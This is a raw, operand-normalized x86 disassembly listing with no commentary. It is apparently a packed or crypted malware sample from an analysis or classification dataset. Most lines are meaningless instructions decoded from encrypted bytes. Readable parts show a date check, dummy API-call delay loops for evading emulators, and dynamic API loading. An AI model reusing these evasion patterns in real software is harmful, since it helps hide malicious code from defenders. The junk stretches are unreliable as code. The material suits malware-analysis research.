sub bl [ cs : esp + ebx ]
jae r-xdata
jae r-xdata
shl [ ebx ] 0x1
sub ah [ eax ]
jae r-xdata
sbb al 0x1c
in al dx
pop ss
or ah [ edx ]
adc ebx [ esp + ebx ]
jae r-xdata
test [ edx - 0x52 ] ebp
jae r-xdata
jae r-xdata
add eax 0x73731c1c
jae r-xdata
pop ss
mov bl 0x89
jecxz r-xdata
sbb al 0x1c
sbb al 0x96
pop es
push 0x54c30b24
mov ebx esp
sbb al 0x74
dec edi
jecxz r-xdata
push esp
pushad
sbb al 0x1c
jae r-xdata
sbb al 0xda
cmpsd [ esi ] [ edi ]
jae r-xdata
sbb al 0x1c
mov ch 0xb3
mov ah 0x1c
and esp [ ebx + 0x1c506d0a ]
and esi [ ebx + 0x751ce389 ]
arpl bx sp
jecxz r-xdata
jae r-xdata
cmpsd [ esi ] [ edi ]
out 0x6a eax
jae r-xdata
sbb al 0x1c
jae r-xdata
mov esp ebx
jae r-xdata
scasb [ edi ]
int1
push 0xbe6a853c
cmpsd [ esi ] [ edi ]
mov [ ecx - 0x41957a48 ] edx
push 0x3eb50a0f
sbb al 0x1c
test [ edx - 0x42 ] ebp
in eax dx
push 0xbe6a853b
sar [ eax ] 0x1
test [ edx - 0x42 ] ebp
mov bl 0xa
jae r-xdata
sbb esp edx
or dl [ edi ]
jne r-xdata
loope r-xdata
jae r-xdata
jecxz r-xdata
adc [ esp + ebx ] ebx
jae r-xdata
mov ah 0x6a
daa
jae r-xdata
push esp
daa
sti
and cx [ edx ]
arpl [ ebp + 0x1c ] bx
dec edi
push 0xec1c661b
scasb [ edi ]
sub ebp [ esi - 0x5a ]
dec ebx
or ecx [ ebp + 0x18 ]
sbb al 0x1c
and bp sp
pop ebx
and [ esp + ebx ] ebx
outsb
scasb [ edi ]
pop ebx
outsb
cmpsb [ esi ] [ edi ]
dec ebx
or edi [ eax + 0x18 ]
sbb al 0x1c
and bp sp
sbb al 0x6e
rol [ ebp - 0x44f45996 ] 0x1
or ch al
xor eax 0x73731c1c
jae r-xdata
jae r-xdata
pushad
shl ebx cl
sti
cmp eax 0x73731c1c
jae r-xdata
jae r-xdata
jecxz r-xdata
jae r-xdata
in al 0xe3
sbb al 0xec
and [ ebx + 0x73 ] dh
jae r-xdata
fdivr [ esp + ebx ]
jae r-xdata
sbb al 0x73
jae r-xdata
jae r-xdata
sbb al 0x1c
mov edx 0xaa323d0
push es
jecxz r-xdata
cmp al 0x1c
sbb al 0x68
sbb esp eax
sbb [ edx ] cl
jg r-xdata
inc [ ebp + 0x67ec2366 ]
movsb [ edi ] [ esi ]
jae r-xdata
mov bl 0x1c
jne r-xdata
jecxz r-xdata
pushad

jae r-xdata
sbb al 0x1c
jae r-xdata
mov al [ 0x236685ff ]
jae r-xdata
jne r-xdata
jecxz r-xdata
movsd [ edi ] [ esi ]
retn
jae r-xdata
sbb al 0x1c
jae r-xdata
sbb al 0x1c
jae r-xdata
sbb al 0x89
cmp al 0x1c
jae r-xdata
jecxz r-xdata
daa
mov [ 0xffffffff80831d8b ] eax
push cs
mov ah 0x6a
movsd [ edi ] [ esi ]
xor [ ecx ] esp
push 0xffffffa6
pop ebp
sbb al 0x1c
jecxz r-xdata
jecxz r-xdata
jae r-xdata
jae r-xdata
in al dx
movsb [ di ] [ si ]
test [ esi + 0x23 ] esp
add eax 0x3ae6a85
mov edx 0xb30ba66e
test [ edx - 0x5a ] ebp
push 0x6a85eba6
scasb [ edi ]
add [ edx ] ecx
inc [ esp + ebx ]
sbb al 0xb
bound ebp [ eax ]
sbb al 0x1c
mov edx 0xa2568ba
or al 0x52
sbb al 0x1c
jae r-xdata
push 0xffffffae
add edi [ edx - 0x4cf45992 ]
sbb esp [ esi + 0x1c ]
in al dx
or edx [ ecx + 0x38 ]
sbb al 0x1c
mov esi [ eax + esi * 8 - 0x3e ]
pop ebp
mov ah 0x6a
movsd [ edi ] [ esi ]
jmp r-xdata
daa
jecxz r-xdata
mov edx [ ebx + 0x5d ]
test al 0x6f
sbb al 0x54
pushad
daa
jae r-xdata
or edi ecx
and bl [ esp + ebx ]
or dl ch
push ds
and ebp esp
mov ebx eax
jae r-xdata
jae r-xdata
cmp [ esp + ebx ] bl
mov ebx [ ebx ]
das
fsubr [ edx - 0x185a954c ]
or esi [ ebp + 0x38 ]
or esp [ esi + 0x38 ]
sbb al 0x1c
std
mov ah 0x6a
movsd [ edi ] [ esi ]
sti
or ebp [ 0xffffffff8b1c1c38 ]
out dx eax
dec esp
and [ edx - 0x4c ] dl
push 0xffffffa5
dec [ ebx ]
and edi [ eax ]
sbb al 0x1c
mov ebp [ esi ]
loope r-xdata
cwde
jae r-xdata
pushad
dec edx
cmp ebx [ esp + ebx ]
jae r-xdata
movsd [ edi ] [ esi ]
out 0xb eax
jne r-xdata
sti
or ch [ esi ]
jae r-xdata
jae r-xdata
jecxz r-xdata
mov ch 0xb5
jae r-xdata
retn
jae r-xdata
inc edi
jecxz r-xdata
jecxz r-xdata
sbb al 0x73
jae r-xdata
sbb al 0xb4
or al dl
push es
jae r-xdata
and ecx esp
or cl [ edx + 0x731c1c19 ]
jae r-xdata
sbb al 0x1c
mov eax [ ebx - 0x4b2abb9c ]
push 0x65
push ebx
jecxz r-xdata
jecxz r-xdata
jae r-xdata
sbb al 0x1c
jae r-xdata
sub ch ah
jecxz r-xdata
mov ch 0x6e
jae r-xdata
mov bh 0x18
sbb al 0x1c
mov bl 0xb5
or dh dh
or ebx [ esp + ebx ]
jae r-xdata
mov ch 0xb5
jae r-xdata
sbb al 0x1c
jae r-xdata
cmp esp [ edi ]
push 0x65
push edi
jecxz r-xdata
cmp [ esp + ebx ] bl
mov ecx edx
test [ edx - 0x5a ] ebp
or edi [ ebx + 0x1c35e80a ]
sbb al 0x73
jae r-xdata
jecxz r-xdata
cmpsb [ esi ] [ edi ]
push ebx
imul esp [ esi + 0x3a66b13 ] 0x6b
cmpsb [ esi ] [ edi ]
xor ebp [ ebx - 0x5a ]
and ebp [ esi - 0x52 ]
pop es
outsb
cmpsb [ esi ] [ edi ]
inc edi
and al 0xa6
pop es
test al 0xb5
scasb [ edi ]
test al 0x24
cmpsb [ esi ] [ edi ]
or esi [ ebp + 0x24b5a8ae ]
cmpsb [ esi ] [ edi ]
xrstor [ eax - 0x59db514b ]
aaa
scasb [ edi ]
mov al [ eax + 0x3ba62491 ]
mov [ eax + 0x2f0a858c ] ss
and eax 0x73731c1c
jae r-xdata
xor al 0x1c
sbb al 0x73
jae r-xdata
jecxz r-xdata
jae r-xdata
outsb
jecxz r-xdata
test [ ebx ] 0x1c1c383f
mov esp [ edi - 0x68 ]
sbb eax 0xb40e8083
push 0xffffffa5
pushad
test [ eax - 0x27 ] esp
jecxz r-xdata
jecxz r-xdata
in al 0xe3
jae r-xdata
pop ecx
sbb al 0x1c
jae r-xdata
mov edx 0x6a859789
scasb [ edi ]
jae r-xdata
arpl [ esi ] bx
sbb al 0x1c
or bh [ edi + 0x22 ]
sbb al 0x1c
and cx [ edx ]
or dl [ ecx + 0x6 ]
jae r-xdata
and ebp esp
jmp r-xdata
xor eax 0x731c1c38
jae r-xdata
daa
in al dx
jae r-xdata
sbb al 0x73
jae r-xdata
sbb esp eax
scasb [ edi ]
mov dh 0x68
lss ecx [ edx ]
dec ecx
add ebx [ esp + ebx ]
jae r-xdata
aaa
xchg edi eax
test [ edx - 0x52 ] ebp
jae r-xdata
mov edx 0x160a9b89
xor eax 0x73731c1c
jae r-xdata
mov esi 0xf50bb42b
or bl [ esp + ebx ]
sbb al 0x1c
jae r-xdata
push es
jae r-xdata
mov ch 0xa
test [ ebx ] 0x1c
sbb al 0x73
jae r-xdata
sbb al 0x1c
or dl dh
cmp [ esp + ebx ] ebx
outsb
test [ ecx ] esi
push 0x961cd7a5
test [ ecx ] si
jae r-xdata
jae r-xdata
jae r-xdata
lodsb [ esi ]
out dx eax
sub ch ah
jmp r-xdata
sbb al 0x1c
jae r-xdata
push 0xffffffae
mov esp ebx
jecxz r-xdata
jae r-xdata
jae r-xdata
or bl al
add ebx [ esp + ebx ]
sbb al 0x73
jae r-xdata
and bp sp
pushad
retn
and ecx [ edx ]
jecxz r-xdata
sbb ebp [ edx - 0x5a ]
xor ebp [ esi - 0x5a ]
xor esi [ ebx + 0x1c51fe0a ]
sbb al 0x73
jae r-xdata
movsd [ edi ] [ esi ]
jae r-xdata
sbb eax 0x8a0a1c1c
sbb eax 0x5b731c1c
popfd
jecxz r-xdata
jecxz r-xdata
sbb al 0x73
pop ebx
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
retn
push 0xbe6a853d
jmp 0xffffffff93509dfc
in al dx
push esp
movsd [ edi ] [ esi ]
in eax 0x1c
cmpsb [ esi ] [ edi ]
sbb ecx [ edx ]
sar [ ebx ] cl
sbb al 0x1c
jae r-xdata
or ecx [ 0x1c1c1c26 ]
popfd
call [ edx + 0x1c ]
xchg edi eax
or eax 0x1c1c1c26
jae r-xdata
push 0xffffffbe
sub esi [ ebx + ecx + 0x1c1c0af5 ]
jae r-xdata
sbb al 0x73
jae r-xdata
or dh [ 0x731c1c59 ]
jae r-xdata
sbb al 0xba
push 0x2a66efac
in al dx
and eax 0x1c52ff0b
mov esp ebx
shl ebx cl
jecxz r-xdata
sbb al 0x1c
jae r-xdata
aad 0x1e
jg r-xdata
xlat
mov al 0xb0
outsb
sbb al 0x96
push 0x961ceba6
or bl al
mov ebx esp
push 0x65
aas
jecxz r-xdata
sbb al 0x97
jae r-xdata
sbb al 0x1c
jae r-xdata
sbb al 0x1c
mov ah 0x6e
scasb [ edi ]
pop ds
or dh al
pop es
push 0x2a270a0f
sbb al 0x1c
jae r-xdata
jecxz r-xdata
jecxz r-xdata
jae r-xdata
jae r-xdata
jecxz r-xdata
pop di
sbb [ esp + ebx ] ebx
mov bl 0x6e
cmpsb [ esi ] [ edi ]
xor esi [ ebx + 0x7751cb0 ]
jecxz r-xdata
mov al 0xb0
mov al 0x6e
jae r-xdata
test [ ebp + 0xaa5a0da ] 0x1c1c59d0
xor esp esp
jae r-xdata
mov dh 0x1f
or ah [ esi ]
push cs
sbb al 0x1c
jae r-xdata
push 0x52ff0b25
sbb al 0x1c
jae r-xdata
jae r-xdata
mov edx 0x66efac68
sub ch ah
in eax 0xb
jae r-xdata
mov ecx [ eax - 0x4f2cac4b ]
pop ds
sbb al 0x1c
or bl [ edx + 0x731c1c1f ]
or ebx [ ebx + 0x3b ]
sbb al 0x1c
jae r-xdata
jae r-xdata
sbb al 0xa
fadd [ ebx ]
sbb al 0x1c
push ebp
in al 0xb3
bound esp [ ecx + ebp ]
jecxz r-xdata
jae r-xdata
xor eax eax
mov [ rw-data ] eax
cmp [ rw-data ] 0x6
je r-xdata
mov esp ebp
pop ebp
dec eax
jae r-xdata
mov edx [ edx - 0x4f2cac4b ]
push 0xffffffe5
sbb al 0xa
jae r-xdata
sbb al 0x1c
jae r-xdata
mov [ rw-data ] 0x40c4
nop
push rw-data
call GetLocalTime
nop
nop
cmp [ rw-data ] 0x7e1
jae r-xdata
nop
push 0x0
push 0x0
push 0x0
call ColorMatchToTarget
jmp r-xdata
sbb al 0x1c
jae r-xdata
0x731c1c1f 0x5b0b
jae r-xdata
mov dh 0x68
mov [ rw-data ] 0x174
mov [ rw-data ] 0x1
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4665e4
retn
jae r-xdata
sbb al 0x1c
jae r-xdata
nop
nop
push 0x0
push 0x0
push 0x0
call ColorMatchToTarget
nop
inc [ rw-data ]
cmp [ rw-data ] 0x152f
jne r-xdata
nop
push r-xdata
push r-xdata
call GetModuleHandleA
push eax
call GetProcAddress
test eax eax
je r-xdata
mov ch 0x53
jae r-xdata
cmp ebx [ esp + ebx ]
pop ebx
jae r-xdata
jae r-xdata
mov [ rw-data ] 0x1774
nop
nop
push 0x0
push 0x0
push 0x0
call ColorMatchToTarget
mov [ rw-data ] 0x1
jmp r-xdata
retn 0x4
in eax 0x5d
shl [ eax + 0x1c4d1a0a ] cl
jae r-xdata
mov edx 0xaa323d0
cmp eax 0x731c1c24
jae r-xdata
push 0x0
push 0x0
push 0x0
call ColorMatchToTarget
inc [ rw-data ]
cmp [ rw-data ] 0x8cea
jne r-xdata
nop
nop
nop
push 0x0
push 0x0
push 0x0
call ColorMatchToTarget
nop
nop
nop
mov eax 0x1c750735
call sub_4026bc
mov [ rw-data ] eax
nop
cmp [ rw-data ] 0x0
je r-xdata
or bl [ edx ]
jae r-xdata
or ecx [ eax + 0x3b ]
jae r-xdata
mov [ rw-data ] 0x1
dec ebp
jae r-xdata
cmp ebx [ esp + ebx ]
jae r-xdata
mov ecx 0x73
xor edx edx
div ecx
cmp edx 0xff
jbe r-xdata
call sub_403198
sbb al 0x73
jae r-xdata
pop ss
loopne r-xdata
push 0xaee01baa
sbb al 0x8b
jae r-xdata
mov eax [ rw-data ]
add eax [ rw-data ]
jae r-xdata
call sub_403190
mov [ ebp + 0xab0d353 ] dh
jae r-xdata
mov [ eax ] dl
nop
inc [ rw-data ]
cmp [ rw-data ] 0x1c74f007
jne r-xdata
call sub_403198
push ebx
jae r-xdata
nop
mov eax [ rw-data ]
mov [ rw-data ] eax
nop
mov eax [ rw-data ]
add eax 0x1
jae r-xdata
nop
nop
mov eax [ rw-data ]
call sub_4026dc
push r-xdata
push r-xdata
call GetModuleHandleA
push eax
call GetProcAddress
mov [ rw-data ] eax
nop
nop
push r-xdata
push r-xdata
call LoadLibraryA
push eax
call GetProcAddress
mov [ rw-data ] eax
nop
nop
mov [ rw-data ] 0x1
sbb cl [ ebp + 0x1c ]
mov al 0xa
jae r-xdata
push 0x0
push 0x0
push 0x0
call ColorMatchToTarget
inc [ rw-data ]
cmp [ rw-data ] 0x8e8b
jne r-xdata
xor eax eax
mov [ rw-data ] eax
push rw-data
call [ rw-data ]
push 0x0
push 0x0
push 0x0
call ColorMatchToTarget
jae r-xdata
push 0x1f
call sub_4060e8
cmp [ rw-data ] 0x7
jbe r-xdata
nop
nop
mov eax [ rw-data ]
add eax 0x1
jae r-xdata
sbb al 0x1c
jae r-xdata
jae r-xdata
nop
push 0x0
push 0x0
push 0x0
call ColorMatchToTarget
push rw-data
call [ rw-data ]
mov edx rw-data
mov eax rw-data
call sub_460e24
mov [ rw-data ] eax
nop
nop
cmp [ rw-data ] 0xc
jbe r-xdata
nop
push 0x0
call sub_460eac
nop
nop
jmp r-xdata
mov [ rw-data ] eax
mov eax [ rw-data ]
mov [ rw-data ] eax
nop
nop
mov eax [ rw-data ]
mov [ rw-data ] eax
call sub_403198
stosb [ edi ]
sub_462590
or dh [ ebx - 0x7 ]
jecxz r-xdata
jae r-xdata
jae r-xdata
or cl [ 0xffffffffbde3e3f2 ]
jae r-xdata
sbb al 0x1c
jae r-xdata
or dl [ edx - 0xe ]
jae r-xdata
jecxz r-xdata
jae r-xdata
cmpsb [ esi ] [ edi ]
fdiv st3
jecxz r-xdata
mov [ ebp + 0x13a66a85 ] eax
mov ebx 0xe3cc590a
in al dx
popad
scasb [ edi ]
mul ebx
jecxz r-xdata
or edi [ esi ]
jae r-xdata
jecxz r-xdata
jae r-xdata
test [ edx - 0x42 ] ebp
dec ebx
mov eax 0x49be6a85
mov ebp 0x73737320
jecxz r-xdata
jae r-xdata
jae r-xdata
in al dx
or al [ esi - 0x76e3e3e2 ]
test [ ebp - 0x44ec5996 ] eax
or bl [ ecx - 0x34 ]
jecxz r-xdata
mov [ esi + 0x3fa66a85 ] ecx
or dl bh
jae r-xdata
or eax esp
fsub st3
jecxz r-xdata
bound ecx [ edi ]
dec edi
out 0xe3 eax
jecxz r-xdata
mov bl 0x89
jae r-xdata
jecxz r-xdata
test [ edx - 0x5a ] ebp
jae r-xdata
and [ ebx + 0x73 ] dh
push edx
jae r-xdata
jae r-xdata
jae r-xdata
cmp edi [ ebx + 0x6a858e89 ]
push 0xffffffa6
aas
jae r-xdata
jecxz r-xdata
xlat
jae r-xdata
xchg edi eax
retn
sbb esp edx
in al dx
dec eax
enter 0xe3e3 0xc2
mov edi 0xa76ef3c7
jecxz r-xdata
xor [ ecx ] cl
sbb al 0x1c
push 0x18d60b25
sbb al 0x1c
mov ebp esp
mov ecx [ ebx ]
loopne r-xdata
jae r-xdata
jae r-xdata
cmp [ ebp + 0x681dbe6a ] al
cmp [ ebp - 0x76bc4196 ] eax
nop
push 0xbe6a853a
inc ecx
push 0xbe6a8539
inc edi
mov eax 0x6a859789
mov esi 0x9089b845
jae r-xdata
jae r-xdata
jae r-xdata
push 0x8580893a
push 0xffffffbe
dec edi
mov eax 0x4dbe6a85
mov [ eax - 0x1c0df2f6 ] edx
mov ebx eax
test [ edx - 0x52 ] ebp
jecxz r-xdata
jae r-xdata
push 0xef27603b
salc
pushad
jecxz r-xdata
sbb al 0x1c
jae r-xdata
mov cl 0xa
mov [ ecx ] bl
or dh [ esp + ecx * 8 ]
in eax 0x8b
or esp eax
jecxz r-xdata
mov bl 0x89
jae r-xdata
out dx eax
jae r-xdata
pushad
jae r-xdata
cmp ah ch
pextrw esp mm3 0xe3
push 0x66f3c7af
sub ch ah
sbb al 0xa
inc edi
jmp r-xdata
and eax 0x1c18d60b
cmovg esp edi
jecxz r-xdata
jae r-xdata
jecxz r-xdata
mov dh 0xa
xor al 0xcc
and bp sp
push esp
jecxz r-xdata
movsb [ edi ] [ esi ]
retn
jae r-xdata
or [ edx ] 0x5a
retn
loope r-xdata
pushad
or dh [ eax ]
or [ esp + ebx ] ebx
sbb [ esp + ebx ] bl
or edx esi
jae r-xdata
add eax ebp
in al dx
jae r-xdata
in al dx
or dh [ ebx + 0x731c1c0c ]
imul esi [ edi + 0x1a6027fe ] 0xffffffc3
or dh ch
popad
jae r-xdata
or edi [ edx + 0x19880ab1 ]
jecxz r-xdata
jae r-xdata
jecxz r-xdata
add eax ebp
jae r-xdata
and al 0xa6
pushad
in al 0xe3
jecxz r-xdata
pushad
or cl [ eax + 0x731c1c19 ]
jae r-xdata
jae r-xdata
sbb al 0x68
cmp esp [ eax + 0x27 ]
out dx eax
sbb al 0xb5
jmp r-xdata
outsb
cmpsb [ esi ] [ edi ]
cmp esp esp
jecxz r-xdata
mov al 0x1c
jne r-xdata
nop [ edx + edi * 4 ] ebx
pushad
jae r-xdata
or ah [ eax + 0x73e3e3f7 ]
or ah cl
loop r-xdata
sbb al bl
jae r-xdata
jae r-xdata
sub ah [ eax ]
jae r-xdata
outsb
jecxz r-xdata
test [ edx - 0x5a ] ebp
adc edi [ ebx - 0x1c33a6f6 ]
sbb cl [ ebx - 0x3acb9e14 ]
jecxz r-xdata
mov bh 0xfe
daa
jecxz r-xdata
jecxz r-xdata
daa
jae r-xdata
jecxz r-xdata
jae r-xdata
jae r-xdata
sbb esp edx
in al dx
in al 0xe3
jecxz r-xdata
jecxz r-xdata
jae r-xdata
sbb al 0xe0
in al dx
popad
sub esp esp
jecxz r-xdata
jecxz r-xdata
jecxz r-xdata
jae r-xdata
jae r-xdata
jae r-xdata
jae r-xdata
sbb al 0x1c
scasd [ edi ]
jae r-xdata
jae r-xdata
jecxz r-xdata
in al 0xe3
cmc
cmpsb [ esi ] [ edi ]
adc esi [ ebx + 0xbeba668 ]
nop [ edx + edi * 4 ] ebx
aaa
mov bl 0xa
mov bl 0xc
sbb al 0x1c
jae r-xdata
xchg [ edi ] bl
jecxz r-xdata
jae r-xdata
jae r-xdata
jae r-xdata
sbb al 0x73
jae r-xdata
cmpsb [ esi ] [ edi ]
jmp r-xdata
jecxz r-xdata
jae r-xdata
jae r-xdata
retn 0xc7bf
call 0xb2a0bb6
sbb al 0xa
jae r-xdata
jae r-xdata
jae r-xdata
and eax esi
jecxz r-xdata
in al dx
call 0xb2a0bb6
jae r-xdata
jae r-xdata
jae r-xdata
jae r-xdata
jmp r-xdata
jae r-xdata
jecxz r-xdata
jae r-xdata
adc [ esp + ebx ] bx
jae r-xdata
jae r-xdata
sbb al [ ebp + 0xa179e6a ]
or dl [ ecx + 0x68e3e3d3 ]
jae r-xdata
in al dx
jecxz r-xdata
mov eax 0xa668202a
add al 0x1c
rcr [ edx + ecx ] 0x1
jae r-xdata
jae r-xdata
mov esi 0x1a540b1f
jae r-xdata
lahf
mov edi 0x1967ece3
and ecx esp
jae r-xdata
jae r-xdata
sbb al 0x1c
jae r-xdata
fwait
shl ebx cl
jae r-xdata
jae r-xdata
jae r-xdata
cdq
int 0xe3
jecxz r-xdata
jae r-xdata
pushad
or ah [ esi + 0x11 ]
jae r-xdata
aas
push 0x9e6a851a
pop ss
or cl [ edi + 0x241c1c09 ]
cmpsb [ esi ] [ edi ]
jecxz r-xdata
jae r-xdata
daa
out dx eax
or bl [ eax + 0x731c1c0f ]
jae r-xdata
or edx [ edx + ebx + 0x1c ]
jae r-xdata
pushad
jae r-xdata
jae r-xdata
lodsb [ esi ]
jae r-xdata
cmpsd [ esi ] [ edi ]
jecxz r-xdata
jae r-xdata
out 0xe3 al
jae r-xdata
and al 0xa6
daa
mov ch 0xae
xchg esp eax
loopne r-xdata
and esp [ ebx + 0x7373202a ]
jae r-xdata
or bl [ ebx + 0x73e3e3e6 ]
sbb al 0xec
jae r-xdata
adc [ esp + ebx ] ebx
jae r-xdata
add eax 0x73e3e3c0
out 0xc6 al
sbb al 0xec
jae r-xdata
pushad
sbb bl [ esp + ebx ]
jae r-xdata
outsb
jae r-xdata
and ah ch
in al 0xe3
jecxz r-xdata
cmp al bl
adc [ edx ] cl
stosb [ edi ]
or bl [ esp + ebx ]
jae r-xdata
jae r-xdata
jecxz r-xdata
jae r-xdata
adc al 0xa
movsd [ edi ] [ esi ]
adc [ esp + ebx ] bl
or bl [ ecx ]
jpo r-xdata
jae r-xdata
loop r-xdata
pushad
in al dx
jae r-xdata
sbb al 0x73
jae r-xdata
pop ds
sbb al 0x1c
jae r-xdata
cmpsd [ esi ] [ edi ]
jae r-xdata
sbb al 0x60
jmp r-xdata
mov ebp 0x68202ab8
cmpsb [ esi ] [ edi ]
or bh dl
push 0xffffffbe
inc ebx
or dh bh
or [ esp + ebx ] bl
jae r-xdata
sbb al 0x54
jecxz r-xdata
mov al 0x1c
jne r-xdata
jae r-xdata
jae r-xdata
cmpsb [ esi ] [ edi ]
push ebx
mov bl 0x6e
xchg [ esp + ebx ] bx
sbb al 0xb3
or al [ 0x73e3e3c0 ]
loop r-xdata
mov al 0xb3
outsb
jecxz r-xdata
mov dh 0x68
punpckldq mmx1 [ edi ]
test [ edx - 0x5a ] ebp
jecxz r-xdata
out 0xc6 al
jae r-xdata
jae r-xdata
jae r-xdata
jae r-xdata
sbb al 0x74
jae r-xdata
xor [ ebx + 0xabacd89 ] edi
push 0xa66a8521
jecxz r-xdata
outsb
pop edi
outsd
bound ecx [ edi ]
and edx [ ebx + edi ]
sub ah [ eax ]
jecxz r-xdata
in al dx
sbb edi eax
jecxz r-xdata
pop ebx
jecxz r-xdata
jae r-xdata
jae r-xdata
outsd
push ds
sbb al 0x1c
test [ edx - 0x62 ] ebp
jne r-xdata
mov al 0xb5
mov ah 0x89
xchg ebx eax
mov esp 0x24689189
test [ edx - 0x5a ] ebp
popad
adc edi edi
jecxz r-xdata
sbb al 0x73
in al dx
in ax 0xe3
jecxz r-xdata
and [ ebp - 0x44ce5996 ] eax
mov ebp ecx
mov edx 0x1c04ac0a
loope r-xdata
jae r-xdata
jae r-xdata
jecxz r-xdata
inc edi
jae r-xdata
push 0xffffffbe
jae r-xdata
int3
cli
xchg ecx eax
in al dx
shl bl 0xe3
jae r-xdata
mov ebp [ edx - 0x4b82cf98 ]
push 0xffffffa5
or ebp esi
int1
jecxz r-xdata
jecxz r-xdata
jecxz r-xdata
sbb al 0x1c
jae r-xdata
jae r-xdata
mov bl 0xb5
or esp ecx
and bp sp
pop esi
jae r-xdata
daa
jecxz r-xdata
push esp
shl [ ebx ] 0x1
mov [ 0xffffffffe3f8fa0a ] eax
jecxz r-xdata
and edi [ ebp - 0x1c186ff6 ]
jecxz r-xdata
jae r-xdata
pop ds
jae r-xdata
push 0xffffffa7
jae r-xdata
push 0xffffffa7
pushad
xchg edi eax
or cl [ ebx - 0x3 ]
jecxz r-xdata
push ebp
mov al [ 0x650ab3db ]
jecxz r-xdata
jecxz r-xdata
mov al 0x1c
xchg edi eax
jecxz r-xdata
sub ah [ eax ]
sbb al 0x96
jae r-xdata
mov bl 0xd0
adc eax 0xe3cdaa0a
shl [ ebx ] 0x1
test [ edx - 0x5a ] ebp
sbb eax 0x1c1f730a
sbb al 0x73
jae r-xdata
jecxz r-xdata
jae r-xdata
xchg esi eax
jae r-xdata
sbb al 0x1c
jae r-xdata
shl [ ebx ] 0x1
mov esp 0x1c0f790a
or dh [ ebp + 0x14 ]
jecxz r-xdata
shl [ ebx ] 0x1
mov ebp 0xe3e7900a
jae r-xdata
push esp
jae r-xdata
jae r-xdata
or edi eax
int1
jecxz r-xdata
or bl [ ebx + 0x8 ]
sbb al 0x1c
jae r-xdata
loope r-xdata
push 0xe2f3c7a7
cmpsd [ esi ] [ edi ]
sbb al 0x60
jae r-xdata
jecxz r-xdata
pop ds
jae r-xdata
je r-xdata
jae r-xdata
jecxz r-xdata
xchg [ edi - 0x59db3271 ] ecx
pop ds
xchg [ edi - 0x4ce31c71 ] ecx
fwait
adc al 0x3b
clc
push 0xeb0f620f
loope r-xdata

jecxz r-xdata
or edi ebp
jae r-xdata
jne r-xdata
jne r-xdata
jecxz r-xdata
jmp r-xdata
or al 0x1c
jae r-xdata
jecxz r-xdata
push 0xffffffa6
sbb al 0x1c
sbb [ edx ] ecx
test [ edx - 0x5a ] ebp
sbb al 0xa
jae r-xdata
and ebp esp
pop ss
sbb al 0x1c
outsb
cmpsb [ esi ] [ edi ]
push ebx
xor ah dh
jecxz r-xdata
mov ebx esp
sbb al 0x75
jecxz r-xdata
out 0x8b eax
jecxz r-xdata
xchg ebp eax
sbb esp [ ebx - 0x1c149e14 ]
jecxz r-xdata
outsb
sbb ebx [ esi ]
sbb al 0x1c
or ebp [ ebx ]
sbb [ esp + ebx ] bl
pushad
push 0xffffffa6
mov dh 0xa
fsincos
jecxz r-xdata
xchg ebp eax
xchg esi eax
jae r-xdata
idiv [ ebx - 0x1c0455f6 ]
jecxz r-xdata
mov ch 0xb4
jecxz r-xdata
xchg ebp eax
mov eax 0x961c202a
and edi [ edx + 0x1bbe6aba ]
jecxz r-xdata
jae r-xdata
sbb al 0x1c
jae r-xdata
mov al 0xb5
mov ah 0x89
cmp [ ecx - 0x25f56a77 ] 0x6
jecxz r-xdata
sbb eax 0xe3d3a50a
test [ ebp - 0x44e45996 ] eax
mov ebp ecx
test [ edx - 0x5a ] ebp
sbb [ ebx + 0x1fa66a85 ] edi
shl [ ebx ] 0x1
test [ edx - 0x5a ] ebp
jecxz r-xdata
sbb al 0x73
jae r-xdata
jae r-xdata
jae r-xdata
jae r-xdata
shl esp cl
jae r-xdata
jmp 0x2daf0c7c
jae r-xdata
jecxz r-xdata
jecxz r-xdata
sub cl [ edx ]
mov esp ss
jecxz r-xdata
jae r-xdata
jecxz r-xdata
jecxz r-xdata
jae r-xdata
mov ch 0xb4
mov [ edx + 0xa9589b9 ] eax
fiadd [ esi ]
or cl [ ebx + 0x731c1c0c ]
mov ebx 0x1c18b40a
sbb al 0x73
sbb al 0x75
dec edi
sub ah [ eax ]
jae r-xdata
mov [ ebx + 0x689189bc ] edx
and al 0x85
push 0xffffffa6
sbb bx [ esi ]
sbb al 0x1c
or ch [ edi ]
or al 0x1c
pop edi
jae r-xdata
mov dh 0x68
sbb al 0x96
test [ esi + 0x15 ] esp
or dh [ edi - 0x12 ]
jecxz r-xdata
rcl [ 0xffffffffe3cdaa0a ] 0x1
or bh [ ecx + 0xf ]
sbb al 0x1c
jae r-xdata
jae r-xdata
or [ esp + ebx ] bl
adc ax 0x770a
out dx al
mov bl 0x89
jae r-xdata
jecxz r-xdata
jae r-xdata
xchg edi eax
jae r-xdata
xchg esi eax
outsb
adc ebx [ esp + ebx ]
jae r-xdata
outsb
sbb ebx [ esi ]
sbb al 0x1c
or edi edx
push ds
in eax dx
cmc
jecxz r-xdata
jae r-xdata
or dl [ ebx ]
nop [ ebx + esi * 2 ] ebx
jae r-xdata
pop es
sbb al 0x96
mov bl 0xb0
or bh [ ebx + ecx * 8 + 0x7373e3e3 ]
test [ edx - 0x42 ] ebp
sbb al 0x95
in al dx
or esi [ edi ]
jae r-xdata
and al 0xa6
jae r-xdata
jae r-xdata
jae r-xdata
popad
jmp r-xdata
jecxz r-xdata
dec edi
daa
or dh bh
outsb
mov bh 0xa
stosb [ edi ]
jecxz r-xdata
sbb al 0x95
mov bl 0x1c
nop [ ebx + esi * 2 ] ebx
jae r-xdata
xchg ecx eax
jae r-xdata
jae r-xdata
sti
sbb al 0xb5
xchg edi eax
or bl [ esi ]
loope r-xdata
jae r-xdata
enter 0xe3e3 0x73
cmpsb [ esi ] [ edi ]
aas
mov [ eax - 0x59db7a74 ] ss
add edx [ edi + 0x2495abc3 ]
cmpsb [ esi ] [ edi ]
cmp dl [ 0xffffffffb8bc1c1c ]
jae r-xdata
jecxz r-xdata
mov ebp [ eax + ecx ]
or eax [ esi ]
in al dx
jecxz r-xdata
or bl bl
or eax 0xbfa56ab4
or dh [ ebp + 0x17 ]
in al dx
jecxz r-xdata
jae r-xdata
or bl dl
push es
push 0xef0f600f
and ecx [ ebp + 0xaaeaeb5 ]
xchg ecx eax
jae r-xdata
or bh [ edx ]
adc eax 0xb8bc1c1c
cmpsb [ esi ] [ edi ]
jmp r-xdata
mov ah 0x18
and [ ebx + 0x73 ] dh
jae r-xdata
